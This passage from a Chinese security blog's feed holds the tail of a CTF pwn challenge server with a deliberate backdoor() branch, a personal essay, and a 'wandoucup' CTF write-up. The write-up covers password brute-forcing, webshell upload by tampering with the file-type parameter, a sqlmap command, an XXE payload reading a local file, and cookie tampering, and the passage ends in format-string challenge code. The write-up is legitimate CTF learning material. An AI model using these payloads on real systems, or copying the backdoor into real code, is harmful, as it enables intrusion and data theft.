punctuation">(</span>uuid<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">uuid_unparse</span><span class="token punctuation">(</span>uuid<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          mq<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>pair<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span><span class="token punctuation">(</span>skey<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          packet <span class="token operator">=</span> <span class="token function">construct_result</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> <span class="token number">36</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// retrieve</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          id_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    corr_id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>corr_id<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>corr_id<span class="token punctuation">,</span> id_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">+</span>id_len<span class="token operator">!=</span>length<span class="token number">-12</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          s_corr_id <span class="token operator">=</span> corr_id<span class="token punctuation">;</span>          it_find <span class="token operator">=</span> mq<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>skey<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>it_find<span class="token operator">!=</span>mq<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            i <span class="token operator">=</span> mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>corr_id <span class="token operator">!=</span> s_corr_id<span class="token punctuation">)</span>            <span class="token punctuation">{</span>              <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">// 出队</span>              res_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>res<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              packet <span class="token operator">=</span> <span class="token function">construct_result</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>res<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> res_len<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>                         <span class="token punctuation">}</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// call</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          id_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    corr_id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>corr_id<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>corr_id<span class="token punctuation">,</span> id_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          expr_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    expr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>expr_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>expr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>expr_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>expr<span class="token punctuation">,</span> expr_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">+</span>id_len<span class="token operator">+</span>expr_len<span class="token operator">!=</span>length<span class="token number">-12</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">// 执行运算</span>          res <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          status <span class="token operator">=</span> <span class="token function">calc</span><span class="token punctuation">(</span>expr<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>status <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          s_corr_id <span class="token operator">=</span> corr_id<span class="token punctuation">;</span>          s_res <span class="token operator">=</span> res<span class="token punctuation">;</span>          it_find <span class="token operator">=</span> mq<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>skey<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>it_find<span class="token operator">!=</span>mq<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 入队</span>            d<span class="token punctuation">.</span>corr_id <span class="token operator">=</span> s_corr_id<span class="token punctuation">;</span>            d<span class="token punctuation">.</span>res <span class="token operator">=</span> s_res<span class="token punctuation">;</span>            mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> done_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// close </span>          <span class="token keyword">return</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// break;</span>        <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>          <span class="token function">backdoor</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>                  <span class="token keyword">default</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// error</span>          <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  MQ mq<span class="token punctuation">;</span>  <span class="token function">handle</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> mq<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>今天就水到这儿吧😭。。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 环境部署 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Some_words_of_today</title>
      <link href="/2018/10/29/Some-words-of-today/"/>
      <url>/2018/10/29/Some-words-of-today/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Some-words-of-today"><a href="#Some-words-of-today" class="headerlink" title="Some_words_of_today"></a>Some_words_of_today</h1><blockquote><p>今日份闲扯。🙃</p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 现在时间已经23:06了，今天给几位学弟简单讲了一些小知识（虽然自己很low，但希望学弟可以很强），写完这篇水文就睡吧。不知道什么时候开始就已经习惯了这么晚睡，虽然知道晚睡啥的，熬夜什么的对身体不好balabala，但是生活所迫，被生活安排的明明白白，虽然目前国内计算机行业现状如下图：</p><p><img src="https://i.loli.net/2018/10/29/5bd722c007501.png" alt=""></p><p>抑或是如下图：</p><p><img src="https://i.loli.net/2018/10/29/5bd72383adca2.png" alt=""></p><p>&nbsp; &nbsp; &nbsp; &nbsp; 刚入学那会儿，大学嘛，憧憬的是啥？无非就是吃喝玩乐，交朋友（找女票？）以及少部分学习。对啊，就是这样没错啊，大家都是这么认为的嘛，一直到大一过去一大半，我也是学学停停，玩玩游戏，<del>以及一场起于高中，止于大一末，经历过一起，也经历过分离，还经历过异地，像电视剧一样的恋爱</del>,呸呸呸 。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 很普遍的一个现象是：很多刚踏入大学校门的人，就想开始来一场轰轰烈烈的恋爱，来释放自己的天性，拥抱心中的美好😄，到后来却往往是最初开始的人走不到一块儿。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 或许得到了什么东西，就该失去点另外的什么东西。所以那段时间我只是生活在一个小圈子里，虽然错过了很多很多的精彩，虚度了些许时日，但也成长了许多。经历了种种后，我才逐渐明白我的大学生活，乃至人生意义所在😥，风花雪月不过偶尔，自强不息便有远方。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 所谓大学者，非谓有大楼之谓也，有大师之谓也，但是现在又有几个能做到？。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 与其奢望平台如何如何帮自己，那为何不“天行健，君子以自强不息”呢？</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 大学只是一个平台，一个给你去生活，去展示，去实现，去创造，去体验社会的小空间。当然，可能某些人进入大学之后，啊我的大学怎么怎么样，怎么怎么惨，抱怨资源不公，哀叹社会如何，然后转身又扑进了游戏世界。想想其实也挺傻的，不公能怎样？谁让自己搏不了一个好平台，谁让自己得不到那点仅有的资源，又是谁在一次一次堕落之后继续堕落？那肯定是自己咯😭。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 所以如果自己不去实现一点能够实现的价值，来印证一下自己的能力，那如何才能获得那所谓的公平，如何去融入你批判，哀叹的那个社会。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 未来之路虽然坎坷，但希望与诸位同行之人，共同前进。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Publish by Yof3ng.</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂文 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>wandoucup-ctf</title>
      <link href="/2018/10/28/wandoucup-ctf/"/>
      <url>/2018/10/28/wandoucup-ctf/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="wandoucup-ctf"><a href="#wandoucup-ctf" class="headerlink" title="wandoucup-ctf"></a>wandoucup-ctf</h1><blockquote><p>这两天在打一个稍微简单的CTF，写个writeup记录一下被虐的过程😭，总的来说这场小赛是个大杂烩，毕竟你懂的😏，作为做题者我们当然是有题做就ok的。</p><p>由于比赛后环境关闭，所以有的无图片展示，现有的图片是下午就准备写writeup截的图。</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web1-签到题"><a href="#web1-签到题" class="headerlink" title="web1-签到题"></a>web1-签到题</h3><p><a href="http://101.231.137.47:20001/" target="_blank" rel="noopener">题目链接</a></p><blockquote><p>跟某几个ctf练习平台上面的滑稽题一样：</p><p><img src="https://i.loli.net/2018/10/28/5bd55a6403431.png" alt=""></p></blockquote><p>一键获取flag😄。</p><h3 id="web2-输入密码查看flag"><a href="#web2-输入密码查看flag" class="headerlink" title="web2-输入密码查看flag"></a>web2-输入密码查看flag</h3><p><a href="http://101.231.137.47:20002/4.php" target="_blank" rel="noopener">题目链接</a></p><blockquote><p>简单浏览一下，就是一个爆破的题：</p><p><img src="https://i.loli.net/2018/10/28/5bd56b3b1d5b7.png" alt=""></p><p>密码为五位数，那我们直接上burpsuite咯：设置长度和payload字符：</p><p><img src="https://i.loli.net/2018/10/28/5bd56b9a814dd.png" alt=""></p><p><img src="https://i.loli.net/2018/10/28/5bd590f273c5b.png" alt=""></p><p>GET FLAG!</p></blockquote><h3 id="web3-这真能传马？"><a href="#web3-这真能传马？" class="headerlink" title="web3-这真能传马？"></a>web3-这真能传马？</h3><p><a href="http://101.231.137.47:20003/" target="_blank" rel="noopener">题目链接</a></p><blockquote><p>简单地抓包修改参数，从而使得自己能够传php，我直接上了一个大马，然后看/opt/flag.txt。</p><p><img src="https://i.loli.net/2018/10/28/5bd56d1fde396.png" alt=""></p><p>抓包可以看到url中的ext参数传递的是文件类型，猜测是可以修改，我们加个php到中间即可成功地直接上传webshell（很抠脚）。</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56da602535.png" class="lazyload"></p><p>然后再修改一下content-type即可：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56ea016a98.png" class="lazyload"></p></blockquote><p>To /opt/flag.txt  get flag==&gt;😄</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56ef831e0e.png" class="lazyload"></p><h3 id="web4-这真能注入？"><a href="#web4-这真能注入？" class="headerlink" title="web4-这真能注入？"></a>web4-这真能注入？</h3><p>题目链接</p><blockquote><p>浏览一下，加个单引号试试就一个很明显的注入咯：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56f5203775.png" class="lazyload"></p><p>直接sqlmap注入即可，<code>sqlmap -u http://101.231.137.47:20004/php/index.php?gid=1 --dbs</code></p><p>得到数据库名后直接逐步指定数据库表，指定字段，dump即可。</p><p>由于比赛后服务已经关闭故未能截取成功图片。</p></blockquote><h3 id="web5-API"><a href="#web5-API" class="headerlink" title="web5-API"></a>web5-API</h3><blockquote><p>这题是xxe外部实体注入，通过抓包，修改POST数据以及Content-type从而读取到/tmp/flag.txt。</p><blockquote><p>XXE漏洞就是服务器接受从客户端发送来的xml格式数据时，xml数据中恶意的引用了外部实体，将它的值绑定为服务器的目标文件，这样在服务器返回给我们解析后的值时，就会把目标文件的内容返回给我们，从而读取敏感文件内容。</p></blockquote><p>题目原本传输的<code>Content-type: application/json</code>改为<code>Content-type: application/xml</code>，并将POST的数据改为以下xml代码:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version=”1.0″?></span><span class="token doctype">&lt;!DOCTYPE a[&lt;!ENTITY xxe SYSTEM “file:///tmp/flag.txt”></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>something</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>something</span><span class="token punctuation">></span></span></code></pre><p>然后发送数据包，就可得到api返回的flag了。</p></blockquote><h3 id="web6-sweet-home"><a href="#web6-sweet-home" class="headerlink" title="web6-sweet home"></a>web6-sweet home</h3><blockquote><p>这道题有点东西，一步一步深入，到最后一个提示放出之后几分钟，迅速拿到flag。</p><p>步骤：登录和注册界面需要写脚本抛出对应规则的code，然后通过目录遍历得到部分页面源码以及一个目录(分别是<code>user.php~</code>， <code>config.php~</code>，<code>adminpic</code>)，根据源码可以得知adminpic是admin用户上传文件的一个目录，并且我们可以得到数据库账号密码，全端口扫描得到23306端口为数据库服务端口，登陆后得到admin账户密码，经过大半天的破解md5之后，得到提示<code>crypto.html</code>，这是一个指定的解密md5的页面，输入admin密码hash值破解得到提示<code>crypto.png</code>，访问得到二维码，扫描即可获得密码<code>wandouxueyuan:)</code>，用此密码可登录admin账户，来到上传图片publish页面，结合前面遍历得到的一个<code>adminpic</code>目录可以知道上传文件在此目录中，经过简单的绕过后上传大马即可。</p><p>傻傻的我还尝试文件包含，session_decode，以及register注册等等操作。</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5d5ba033c9.png" class="lazyload"></p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a2a3dd284.png" class="lazyload"></p><p>传完马后访问/adminpic目录即可看到自己上传的文件，从而getshell拿到flag：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5d6ffa0abd.png" class="lazyload"></p><h3 id="web附加题-atom"><a href="#web附加题-atom" class="headerlink" title="web附加题-atom"></a>web附加题-atom</h3><blockquote><p>这道web加餐题，实际上就是用给的账户密码登录后将cookie中的<code>admin=0</code>改为<code>admin=1</code>，然后会跳转到一个后台，然后查看后台源码即可得到真正的flag。</p></blockquote><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><blockquote><p>三个pwn都非常经典，分别考察格式化字符串漏洞，简单的溢出，以及ret2sys几个知识点。</p></blockquote><h3 id="pwn1–格式化字符串漏洞"><a href="#pwn1–格式化字符串漏洞" class="headerlink" title="pwn1–格式化字符串漏洞"></a>pwn1–格式化字符串漏洞</h3><p>通过用IDA简单地分析一下逻辑，可以看到printf处存在格式化字符串漏洞：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#vuln_fun函数伪c代码</span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-Ch] [ebp-7Ch]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-8h] [ebp-78h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-4h] [ebp-74h]</span>  <span class="token keyword">int</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-70h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-6Ch]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-68h]</span>  <span class="token 